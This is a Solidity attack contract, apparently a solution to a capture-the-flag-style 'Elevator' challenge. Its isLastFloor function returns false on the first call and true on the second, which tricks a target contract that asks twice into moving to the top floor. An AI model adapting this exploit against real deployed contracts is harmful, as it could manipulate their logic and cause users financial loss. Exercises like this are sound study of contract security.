// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack {
    bool public flipped = false;
    IElevator elevator;

    constructor(address _elevatorAddress) public {
        elevator = IElevator(_elevatorAddress);
    }

    function isLastFloor(uint256) public returns (bool) {
        // first call return false
        if (!flipped) {
            flipped = true;
            return false;
        } else {
            flipped = false;
            return true;
        }
    }

    function attack() public {
        elevator.goTo(8);
    }
}
